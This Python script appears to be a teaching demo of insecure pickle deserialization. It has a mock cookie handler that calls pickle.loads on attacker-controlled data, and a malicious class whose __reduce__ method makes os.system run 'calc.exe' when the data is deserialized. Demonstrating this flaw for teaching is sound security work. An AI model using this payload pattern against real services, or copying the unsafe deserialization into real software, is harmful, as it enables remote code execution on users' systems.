import pickle
import base64
import os

class User:
    def __init__(self, username, is_admin):
        self.username = username
        self.is_admin = is_admin

def process_cookie(cookie_data):
    """
    This function simulates a web server processing a cookie.
    It decodes and deserializes the data to get the user object.
    """
    try:
        decoded_cookie = base64.b64decode(cookie_data)
        
        # DANGEROUS: Deserialize the data using pickle
        # An attacker controls the 'decoded_cookie' bytes.
        user_obj = pickle.loads(decoded_cookie)
        
        print(f"Welcome back, {user_obj.username}!")
        if user_obj.is_admin:
            print("You have admin privileges.")
        
    except Exception as e:
        print(f"Error processing cookie: {e}")

# --- Simulating a "good" cookie from a normal user ---
# Create a normal user object
normal_user = User(username="Alice", is_admin=False)

# Serialize and encode it, just like the server would
good_cookie = base64.b64encode(pickle.dumps(normal_user))
print(f"Normal user's cookie: {good_cookie.decode()}\n")

# --- Let's run the server with our good cookie ---
print("--- Processing a normal user's cookie ---")
process_cookie(good_cookie)

class RCE:
    """
    A malicious class designed for Remote Code Execution.
    When an instance of this is deserialized, it will run a command.
    """
    def __reduce__(self):
        # This magic method is called during deserialization.
        # It tells pickle to run os.system() with our command.
        cmd = ('calc.exe')
        return (os.system, (cmd,))

# Create an instance of our malicious class
malicious_obj = RCE()

# Serialize it and encode it into a fake cookie
malicious_cookie = base64.b64encode(pickle.dumps(malicious_obj))

print("--- Malicious Cookie Payload ---")
process_cookie(malicious_cookie)